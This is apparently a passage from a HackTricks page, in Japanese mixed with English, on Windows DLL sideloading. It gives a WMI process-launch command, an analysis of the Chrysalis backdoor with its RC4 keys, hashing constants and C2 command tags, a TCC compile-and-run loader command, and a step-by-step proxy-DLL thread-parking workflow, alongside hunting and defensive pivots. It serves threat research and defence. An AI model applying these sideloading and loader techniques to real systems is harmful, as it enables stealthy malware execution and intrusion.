- `curl -s -L` は進捗表示を隠し、redirect を追従する; `tar -xf` は Windows の built-in tar を使う。

- **WMI/CIM launch:** WMI 経由で EXE を起動し、telemetry 上では CIM-created process として見せつつ、同じ場所にある DLL を load させる:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- local DLL を優先する binary（例: `intelbq.exe`、`nearby_share.exe`）で動作する; payload（例: Remcos）は trusted name の下で実行される。

- **Hunting:** `/p`、`/m`、`/c` が同時に現れる `forfiles` に alert を出す; admin script 以外では珍しい。

## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

最近の Lotus Blossom の intrusion では、trusted な update chain を悪用して NSIS-packed dropper を配布し、DLL sideload と fully in-memory payload を展開した。

Tradecraft flow
- `update.exe` (NSIS) が `%AppData%\Bluetooth` を作成し、**HIDDEN** 属性を付け、リネームされた Bitdefender Submission Wizard の `BluetoothService.exe`、malicious な `log.dll`、encrypted blob `BluetoothService` を配置し、その後 EXE を起動する。
- host EXE は `log.dll` を import し、`LogInit`/`LogWrite` を呼ぶ。`LogInit` は blob を mmap-load し、`LogWrite` は custom な LCG-based stream（定数 **0x19660D** / **0x3C6EF35F**、key material は prior hash から導出）で decrypt し、buffer を plaintext shellcode で上書きし、temporary を解放してそこへ jump する。
- IAT を避けるため、loader は **FNV-1a basis 0x811C9DC5 + prime 0x1000193** で export name を hash し、その後 Murmur-style avalanche（**0x85EBCA6B**）を適用して salted target hash と比較することで API を resolve する。

Main shellcode (Chrysalis)
- key `gQ2JR&9;` を使って add/XOR/sub を 5 pass 繰り返し、PE-like main module を decrypt し、その後 `Kernel32.dll` → `GetProcAddress` を dynamic に load して import resolution を完了する。
- per-character の bit-rotate/XOR transform を使って runtime で DLL name string を再構築し、その後 `oleaut32`、`advapi32`、`shlwapi`、`user32`、`wininet`、`ole32`、`shell32` を load する。
- 2つ目の resolver は **PEB → InMemoryOrderModuleList** を走査し、各 export table を 4-byte block で Murmur-style mixing 付きで parse し、hash が見つからない場合のみ `GetProcAddress` に fallback する。

Embedded configuration & C2
- config は配置された `BluetoothService` file の **offset 0x30808**（size **0x980**）にあり、key `qwhvb^435h&*7` で RC4-decrypt され、C2 URL と User-Agent が明らかになる。
- beacon は dot-delimited の host profile を生成し、tag `4Q` を先頭に付け、key `vAuig34%^325hGV` で RC4-encrypt してから HTTPS 越しに `HttpSendRequestA` を行う。response は RC4-decrypt され、tag switch（`4T` shell、`4V` process exec、`4W/4X` file write、`4Y` read/exfil、`4\\` uninstall、`4` drive/file enum + chunked transfer cases）で処理される。
- 実行 mode は CLI args で分岐する: 引数なし = `-i` を指す persistence（service/Run key）を install; `-i` は自分自身を `-k` 付きで再起動; `-k` は install を省いて payload を実行。

Alternate loader observed
- 同じ intrusion では Tiny C Compiler も配置され、`C:\ProgramData\USOShared\` から `svchost.exe -nostdlib -run conf.c` を `libtcc.dll` を隣に置いて実行した。攻撃者提供の C source は shellcode を埋め込み、compile され、PE を disk に残さず in-memory で実行された。再現するには:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- この TCC ベースの compile-and-run ステージは `Wininet.dll` を runtime で import し、hardcoded URL から second-stage shellcode を取得して、compiler 実行を装う柔軟な loader を提供した。

## Signed-host sideloading with export proxying + host thread parking

Some DLL sideloading chains add **stability engineering** so the legitimate host stays alive long enough to load later stages cleanly instead of crashing after the malicious DLL is loaded.

Observed pattern
- 期待される dependency 名として `version.dll` などを使い、trusted EXE を malicious DLL の横に drop する。
- malicious DLL は、すべての期待される export を real system DLL（たとえば `%SystemRoot%\\System32\\version.dll`）へ **proxy** し、import resolution が成功し続けて host process が動作を維持できるようにする。
- load 後、malicious DLL は host entry point を **patch** して、main thread が終了したり process を terminate する code paths を実行したりせず、無限の `Sleep` loop に入るようにする。
- 新しい thread が本来の malicious work を実行する。次の stage の DLL 名や path を decrypt し（RC4/XOR が一般的）、`LoadLibrary` で起動する。

Why this matters
- 通常の DLL proxying は API compatibility を維持するが、later stages のために host が十分長く生存することまでは保証しない。
- main thread を `Sleep(INFINITE)` に置くのは、loader が worker thread 内で decryption、staging、network bootstrap を行っている間、signed process を resident に保つ単純な方法。
- `DllMain` だけを suspicious として追うと、host entry point が patch されて secondary thread が開始された後に interesting behavior が起きる場合、この pattern を見逃す。

Minimal workflow
1. signed host EXE をコピーし、local directory からどの DLL を解決するかを判定する。
2. 同じ functions を export し、legitimate DLL に forwarding する proxy DLL を build する。
3. `DllMain(DLL_PROCESS_ATTACH)` で worker thread を create する。
4. その thread から host entry point または main thread start routine を patch して、`Sleep` で loop するようにする。
5. 次の stage の DLL 名/config を decrypt し、`LoadLibrary` を call するか、payload を manual-map する。

Defensive pivots
- `System32` ではなく、自身の application directory から `version.dll` や同様の common libraries を load する signed processes。
- image load の直後に process entry point へ加えられる memory patch、特に `Sleep`/`SleepEx` へ redirected された jumps/calls。
- proxy DLL によって create された threads が、decrypted 名を持つ second DLL に対して直ちに `LoadLibrary` を call する挙動。
- `ProgramData`、`%TEMP%`、または unpacked archive paths のような writable staging directories 内で、vendor executables の横に置かれた full-export proxy DLL。

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)


{{#include ../../../banners/hacktricks-training.md}}
